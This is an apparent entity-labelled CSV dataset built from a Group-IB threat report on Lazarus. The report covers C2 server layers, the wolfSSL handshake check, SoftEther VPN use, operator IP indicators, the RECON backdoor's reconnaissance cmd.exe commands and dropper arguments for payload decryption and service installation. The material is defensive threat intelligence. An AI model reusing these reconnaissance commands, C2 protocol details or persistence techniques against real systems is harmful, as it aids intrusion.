DocName,text,intent
Group-IB_Lazarus," arisen:  
architecture, tools, attribution8

After the start, Server_TrafficForwarder reads the contents of the key and 
certificate files from the root directory that will be used to create an SSL 
tunnel. That said, the file does not contain any information about the servers 
to which traffic should be transferred. At the first start, hackers manually 
specify the port to listen on as well as the address of the C&C server to 
which traffic is to be sent. In the event the port is not specified, the program 
listens on a random port and waits for incoming connections. 

To verify communication with a compromised server, hackers check if the 
client is appropriate: they send the first network request; when a response 
is received from the client, they decrypt it and compare with a previously 
known response. In the event the responses are different, the connection is 
broken. 

The table below contains all commands available:

The only difference in the Server_TrafficForwarder configuration on Layer 
1 and Layer 2 servers respectively is that Server_TrafficForwarder installed 
on Layer 1 accepts traffic from port 443 and forwards it on the same port 
of Layer 2. While Layer 2 accepts traffic on port 443 and forwards it to port 
8080 of Layer 3.

Commands Description

0x1095 -

0x1096 Collects and sends system 
information

0x10AA Gets the configuration

0x10AB Changes the configuration 
(including the port on which 
it listens for connections)

0x10AE -

0x10AF -

0x10B3 Reads a private key file and 
sends it to the operator

0x10B4 Records data to a file

Commands Description

NONE -

GINF Collects and sends system 
information

GCFG Gets the configuration 

SCFG Changes the configuration 
(including the port on which 
it listens connections) 

SLEP -

HIBN -

LCLR Records data to a file

LDWN Reads a private key file and 
sends it to the operator

Commands of the first version: Commands of the second version:



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution9

To encrypt all of its network connections, the traffic forwarder uses the 
statically linked wolfSSL libraries and SSL certificates which are generated 
by a pre-defined template. The “Issued for“ field always contains a third-level 
domain slash an email address.  

A few examples are shown below: 

• www.resfinan.com/emailAddress=info@resfinan.com

• finews.otzo.com/emailAddress=master@otzo.com

• host.global.com/emailAddress=info@host.global.com

• latest.ignorelist.com/emailAddress=consult@latest.ignorelist.com 

With information about this template, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists managed to detect 
similar certificates and associated hosts. With these indicators, you can check 
if your organization was, or is, under attack by ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus,".

 
",O
Group-IB_Lazarus,Backend_Listenerr,malware
Group-IB_Lazarus," is software installed by attackers on Layer 3 servers. The 
program performs communications with other servers, receives commands 
from the administrator and sends them in chain order to the end infected 
computer. 

",O
Group-IB_Lazarus,Backend_Listenerr,malware
Group-IB_Lazarus," listens on the two ports:

• port 8080, to which it accepts SSL connections from Layer 2 servers.

• port 9090, to which it accepts connections from the control system 
(",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus,"). 

To encrypt traffic, the wolfSSL open source library is used. After the 
application is launched, the private key and certificate files are loaded from 
the root directory. These files are used to encrypt traffic between the C&C 
server and connected clients.

To defend against security solutions designed to “unpack” SSL encrypted 
traffic, ",O
Group-IB_Lazarus,Backend_Listenerr,malware
Group-IB_Lazarus," encrypts all data sent over an SSL channel using an 
additional reversible encryption algorithm and performs legitimacy checks.  

To reverse-engineer the protocol of server communications with clients, 
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists have developed a client that successfully connects to 
both above-mentioned ports.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution10

This allowed us to analyze communications between the Admin-Tool and 
",O
Group-IB_Lazarus,Backend_Listenerr,malware
Group-IB_Lazarus," and we discovered that: 

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," must have an key pair that is identical to the server 

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," sends a customized Hello-package that differs from the one 
that is provided by the library. By default this package (msg) is specified in 
the library as follows: 

 
",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," sends an encrypted (special) packet with a length from the 
previous packet (len). 

The server decrypts the contents of the packet sent.After decryption, the 
following conditions must be true:

3

4

static unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };
static unsigned char ecnrypted_str[17] = { 0x38, 0x94, 0x3C, 0x6A, 0x58, 0x39, 
0x1A, 0x56, 0x81, 0x4B, 0x09, 0x99, 0x1D, 0xE0, 0xCF, 0x81, 0x3F };

(DWORD)&decrypted_buff[5] == len 
(DWORD)&decrypted_buff[15] == len

where len is the length of the packet

1

2

The correct Hello packet that will be accepted by ",O
Group-IB_Lazarus,Backend_Listener,malware
Group-IB_Lazarus," must be of the 
following form:

 
In fact, this is an information packet, rather than a Hello packet, and its first byte 
contains the length of the next packet sent («len»), while the rest bytes must be zero 
in this case.

#ifndef WOLFSSL_ALT_TEST_STRINGS
char msg[32] = «hello wolfssl!»;   /* GET may make bigger */

static unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution11

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus,  sends DWORD with len2 ,O
Group-IB_Lazarus,<,O
Group-IB_Lazarus," 201 where len2 is the length of the 
next package.  

",O
Group-IB_Lazarus,Admin_Tool,malware
Group-IB_Lazarus," sends encrypted (special) package #2. It’s length is determined 
in the previous package. 

Server decrypts the content of the package, and the following rules should 
work there after decryption: 

VPN: the attackers installed ",O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus," (http://softether.net/) service 
supported by ",O
Group-IB_Lazarus,University of Tsukuba,org
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus," on some servers to unsure 
additional level of anonymity. 

",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," have chosen this service for the following reasons:

• This legitimate application isn’t detected by security solutions 

• It can establish VPN connection via ICMP or DNS to avoid detection by network 
security solutions 

• It contains Dynamic DNS function, which means that if a compromised system has 
a dynamic IP address, the attacker can always find it by DNS name connected to 
the VPN client 

• This VPN client supports ",O
Group-IB_Lazarus,Windows,software
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Linux,software
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,FreeBSD,software
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Solaris,software
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Mac OS X,software
Group-IB_Lazarus,"

6

7

static unsigned char ecnrypted_str[17] = {  
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 

    0xC8, 0x88, 0xE0, 0xE4, 0x94, 0x85, 0xCC, 0xD1, 0x03, 0x00, 

(DWORD)&decrypted_buff[4] == 0xD1CC8594  
(DWORD)&decrypted_buff[8] == 3

Only if all validity checks are made, the traffic is forwarded from one port to another in 2 
streams. Following this, when the client connects to the first port (8080), the service will 
forward the traffic from the first port to the second one, and back.

The operators connected to port 9090 of Layer 3 servers from the following IP 
addresses: 

- ",O
Group-IB_Lazarus,210.52.109.22,ioc
Group-IB_Lazarus, (,O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,")

- ",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus, (,O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,")

- ",O
Group-IB_Lazarus,157.7.135.182,ioc
Group-IB_Lazarus, (,O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus,) and ,O
Group-IB_Lazarus,202.101.36.45,ioc
Group-IB_Lazarus, (,O
Group-IB_Lazarus,China,country
Group-IB_Lazarus,) - via ,O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus,"

5

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution12

In addition to multi-layer server structure, hackers developed a specialized 
toolset to perform remote control over infected PCs.

The group actively attempted to conceal their activity, complicating malware 
detection and analysis as much as possible. All tools consist of modules, which 
were delivered separately to target organizations only. To complicate malware 
investigation, criminals encrypted and obfuscated their tools.

Modular architecture of the victim’s infection process provides both additional 
flexibility and anonymity throughout the cyber-attack. This scheme allows 
hackers to divide software development activity between teams, as well as to 
ensure the reuse of program code.

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus," is a backdoor that is initially installed on the target machine through 
successful execution of exploits. This module is used by hackers to perform 
initial reconnaissance to search for systems of interest. 

Once launched, the program adds itself to the auto-start by copying its file 
to the directory ""%USERPROFILE%\AppData\Roaming\Microsoft\Windows\
Start Menu\Programs\Startup"", collects data about the system and network 
environment and sends them to the C&C server. 

2.3  Tools to control infected PCs 

cmd.exe /c hostname
cmd.exe /c whoami
cmd.exe /c ver
cmd.exe /c ipconfig -all
cmd.exe /c ping www.google.com
cmd.exe /c query user
cmd.exe /c net user
cmd.exe /c net view
cmd.exe /c net view /domain
cmd.exe /c reg query «HKCU\SOFTWARE\Microsoft\Windows\
CurrentVersion\Internet Settings»
cmd.exe /c tasklist /svc
cmd.exe /c netstat -ano | find «TCP»

Below is a list of data collected:

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus," Performs initial reconnaissance to determine if a systems is of 
interest to the threat actors

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, Extracts and decrypts ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus, Decrypts the payload — ,O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus, or ,O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," 
— and injects into the legitimate process

",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," Forwards operator’s commands from external network into 
corporate network

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," Provides full control over the target system



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution13

In the event the system is not of interest, the module will use the ""killkill"" 
command to remove itself from the infected system. If the system is of interest, 
then ",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus, downloads ,O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, using the “http” command. ,O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus," will then 
install ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," to the infected system as follows: 

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus, extracts and decrypts ,O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,", embeds it into the system and 
extracts ",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,".

To decrypt the configuration file, ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus," needs MD5 encryption key, which 
only the attacker knows.

",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus, specialists have analyzed two versions of ,O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,". There are no 
fundamental differences between them: both versions were used to decrypt 
the loader and encrypted payload, as well as to ensure loader persistence in 
the system.

Arguments Description

dropper.exe -l Enumerates system 
services

dropper.exe  -e 
[path]

Retrieves and decrypts 
encrypted payload and 
saves it to the specified file

dropper.exe –a 
[service name] 
[path to DLL]

Installs the library as a 
service

Arguments Description

dropper.exe -x 
[key] -l

Enumerates system services

dropper.exe 
-x [key] -e 
[servicename] 
[config]

Extracts and decrypts the payload 
from config and sets it as a service

dropper.exe -x 
[key] -f

Installs implants by adding 
information about them to the 
system registry

dropper.exe 
-x [key] -o 
[eventname]

Calls OpenEventA with a special 
event name

dropper.exe 
-x [key] -t 

Calls OpenEventA with a special 
event name, then calls Setvent API

Commands of the first version:

Version 1 Version 2

In addition, ",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus," can read executable data from registry keys and embed 
them in the selected process. The executable data is read from the following 
registry keys:

• HKLM\SYSTEM\CurrentControlSet\Services\",O
Group-IB_Lazarus,"\Security\Data2

• HKLM\SYSTEM\CurrentControlSet\Services\",O
Group-IB_Lazarus,"\Security\Data3

Commands of the second version

",O
Group-IB_Lazarus,RECON,malware
Group-IB_Lazarus,"

СИСТЕМНЫЕ 
ПРОЦЕССЫ

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Dropper,malware
Group-IB_Lazarus," decrypts 
and embeds ",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus,"
extracts decrypted 
",O
Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Loader,malware
Group-IB_Lazarus," decrypts 
and embeds 
",O
Group-IB_Lazarus,Client_RAT,malware
